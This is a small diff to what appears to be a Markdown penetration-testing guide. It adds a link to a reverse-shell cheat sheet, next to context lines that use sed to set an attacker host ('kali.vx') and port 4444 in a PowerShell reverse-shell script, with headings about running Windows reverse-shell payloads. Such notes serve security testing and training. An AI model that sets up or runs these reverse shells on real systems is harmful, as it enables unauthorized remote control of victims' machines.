@@ -58,6 +58,8 @@ sed -i 's/<ADDRESS>/kali.vx/' reverse.ps1
 sed -i 's/<PORT>/4444/' reverse.ps1
 ```
 
+### Other reverse shell examples at [HighOn.Coffee](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
+
 # 2. Execute payloads on Windows
 
 ## 2.1. Execute Windows reverse shell TCP payload
